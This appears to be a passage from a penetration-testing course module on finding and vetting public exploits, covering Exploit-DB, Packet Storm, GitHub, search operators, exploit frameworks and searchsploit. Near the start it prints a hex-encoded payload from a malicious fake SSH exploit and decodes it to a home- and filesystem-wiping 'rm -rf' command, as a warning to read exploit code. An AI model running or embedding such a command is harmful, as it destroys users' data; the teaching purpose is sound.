### Further Examination of the Payload

Upon further examination, the payload revealed an interesting `jmpcode` array. The following is the hex-encoded string:

```c
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
```

#### Listing 350 - Malicious SSH Exploit Hex-Encoded Payload

Although it appeared to be shellcode, the `jmpcode` character array was actually a hex-encoded string containing a malicious shell command.

```python
kali@kali:~$ python3
>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
```

#### Listing 351 - Malicious SSH Exploit Payload that Will Wipe Your Attacking Machine

This single command would effectively wipe out the attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions, making this an extremely dangerous and potentially embarrassing malicious exploit.

Given this danger, we will rely on more trustworthy exploit repositories in this module.

### Online Exploit Resources

The online resources mentioned in this module analyze the submitted exploit code before hosting it online. However, it is still important to read the code ourselves to get a rough idea of what it will do upon execution. This is also a great way to improve our code-reading skills.

Exploits written in low-level programming languages and requiring compilation are often hosted in both source code and binary formats. While compiling source code can be cumbersome, it is easier to inspect than binaries (without specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or sandbox. Snapshots allow the environment to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

### 15.2 Online Exploit Resources

This learning unit covers the following objectives:
- Access multiple online exploit resources
- Differentiate between various online exploit resources
- Understand the risks associated with online exploit resources
- Use Google search operators to discover public exploits

After the information gathering and enumeration stages of a penetration test, we can cross-check discovered software for known vulnerabilities and find published exploits.

Various online resources host exploit code and make it available to the public for free. In this section, we will cover the most popular online resources. The first two resources usually conduct tests on the submitted exploit code and remove any that are deemed fake or malicious.

#### 15.2.1 The Exploit Database

The Exploit Database (commonly known as Exploit-DB or EDB) is a project maintained by OffSec. It is a free archive of public exploits gathered through submissions, mailing lists, and public resources.

**Figure 226: The Exploit Database homepage**

Let’s analyze the homepage. By default, the list is sorted with the newest exploit at the top. The highlighted fields include:
- **D**: A quick way to download the exploit file.
- **A**: Lists the vulnerable application files of respective exploits (if available).
- **V**: Marks whether the exploit has been verified. Verified exploits have been reviewed, executed, and confirmed to be functional.
- **Title**: Usually gives the vulnerable application name, version, and the function of the exploit.
- **Type**: Designates the exploit type (dos, local, remote, or webapp).
- **Platform**: Designates which systems are affected by the exploit (operating systems, hardware, or code language services).
- **Author**: Designates the author of the exploit.

**Figure 227: m1k1o’s Blog v.10 - Remote Code Execution (RCE) (Authenticated)**

Each exploit has a unique ID (EDB-ID) and is associated with a Common Vulnerabilities and Exposures (CVE) number. Below the information fields is the text of the exploit code. We can use the Exploit-DB site to do quick code reviews before downloading the exploit.

Exploit Database updates are announced through Twitter and RSS feeds.

#### 15.2.2 Packet Storm

Packet Storm is an information security website that provides up-to-date information on security news, exploits, and tools for educational and testing purposes.

**Figure 228: Packet Storm homepage**

Like the previously-mentioned online resources, Packet Storm also posts updates to Twitter and hosts an RSS feed.

#### 15.2.3 GitHub

GitHub is an online code hosting platform for version control and collaboration. This allows anyone to create and share code, including exploits.

**Figure 229: GitHub homepage**

Due to its open nature, using exploits from GitHub presents a large security risk, and caution is advised. Unlike the previous two resources, GitHub repositories can be created by anyone and distributed without oversight. For example, a user recently tweeted a warning that executing a specific malicious exploit hosted on GitHub would instead infect the user with a backdoor.

**Figure 230: Malicious GitHub Exploit Warning**

While not all GitHub repositories are malicious, they must be treated with caution. A benefit of using GitHub as an exploit resource is the speed at which exploits can be made available. Members of the security community can create proof-of-concept code and share it almost as quickly as new vulnerabilities are discovered.

OffSec has a GitHub account where we can find different repositories like `exploitdb-bin-sploits`, which contains pre-compiled exploits for easy execution.

**Figure 231: OffSec GitHub**

#### 15.2.4 Google Search Operators

In addition to the individual websites, we can search for additional exploit-hosting sites using popular search engines. We can use specific software versions followed by the "exploit" keyword and include various search operators to narrow our search.

For example, we can use the following search query to locate vulnerabilities affecting the Microsoft Edge browser and limit the results to only those exploits hosted on the Exploit Database website:

```bash
kali@kali:~$ firefox --search "Microsoft Edge site:exploit-db.com"
```

**Listing 352 - Using Google to search for Microsoft Edge exploits on exploit-db.com**

Other useful search operators include `inurl`, `intext`, and `intitle`.

Use extreme caution when using exploits from non-curated resources!

### 15.3 Offline Exploit Resources

This learning unit covers the following objectives:
- Access multiple exploit frameworks
- Use SearchSploit
- Use Nmap NSE Scripts

Internet access is not always guaranteed during a penetration test. If the assessment takes place in an isolated environment, Kali Linux comes with various tools that provide offline access to exploits.

#### 15.3.1 Exploit Frameworks

An exploit framework is a software package that contains reliable exploits for easy execution against a target. These frameworks have a standardized format for configuring an exploit and allow both online and offline access to the exploits. This section will cover some popular exploit frameworks.

- **Metasploit**: An excellent framework built to assist in the development and execution of exploits. It was created by H D Moore in 2003 and is owned by Rapid7. Metasploit allows for easy execution of pre-loaded exploits with minor configuration settings. It has a free community edition and a paid pro version.
- **Core Impact**: Another exploit framework owned by HelpSystems. There are no free versions for this framework. It can automate testing, link to vulnerability scanners, complete phishing campaigns, and re-test exploited systems to verify remediation.
- **Canvas**: Made by Immunity, this exploit framework provides regular updates every month after purchase.
- **Browser Exploitation Framework (BeEF)**: A penetration testing tool focused on client-side attacks executed within a web browser.

#### 15.3.2 SearchSploit

The Exploit Database provides a downloadable archived copy of all hosted exploit code. This archive is included by default in Kali in the `exploitdb` package. We recommend updating the package before any assessment to ensure the latest exploits are installed. The package can be updated using the following commands:

```bash
kali@kali:~$ sudo apt update && sudo apt install exploitdb
[sudo] password for kali: 
...
The following packages will be upgraded:
exploitdb
...
Setting up exploitdb (20220526-0kali1) ...
...
```

**Listing 353 - Updating the exploitdb package from the Kali Linux repositories**

The above command updates the local copy of the Exploit Database archive under `/usr/share/exploitdb/`. This directory is split into two major sections: `exploits` and `shellcodes`. Each section contains CSV files with file information for all files within their respective subdirectories. These CSV files contain similar information to the Exploit DB website, such as the EDB-ID, title, author, platform, and other details covered previously.

```bash
kali@kali:~$ ls -1 /usr/share/exploitdb/
exploits
files_exploits.csv
files_shellcodes.csv
shellcodes
```

**Listing 354 - Listing the two major sections in the archive main directory with the database reference files**

When we navigate to the `exploits` directory, we’ll find many sub-directories containing all of the exploits. These sub-directories are separated based on operating system, architecture, scripting language, etc. For example, the `linux` subdirectory contains all Linux-related exploits.

```bash
kali@kali:~$ ls -1 /usr/share/exploitdb/exploits
aix
alpha
android
arm
ashx
asp
aspx
atheos
beos
bsd
bsd_x86
cfm
cgi
freebsd
freebsd_x86
...
```

**Listing 355 - Listing the content of the exploits directory**

Manually searching the Exploit Database is not ideal, especially given the large quantity of exploits in the archive. This is where the `searchsploit` utility comes in handy.

We can run `searchsploit` from the command line without any parameters to display its usage:

```bash
kali@kali:~$ searchsploit
Usage: searchsploit [options] term1 [term2] ... [termN]
...
```

**Listing 356 - The searchsploit command syntax**

As the built-in examples reveal, `searchsploit` allows us to search through the entire archive and display results based on various search options provided as arguments.

```plaintext
========== Examples ==========
searchsploit afd windows local
searchsploit -t oracle windows
searchsploit -p 39446
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
searchsploit -s Apache Struts 2.0.0
searchsploit linux reverse password
searchsploit -j 55555 | json_pp
```

### Conclusion

This module covers the essential aspects of accessing and using online and offline exploit resources. By understanding these resources and tools, you can effectively identify and utilize exploits in a secure and controlled manner.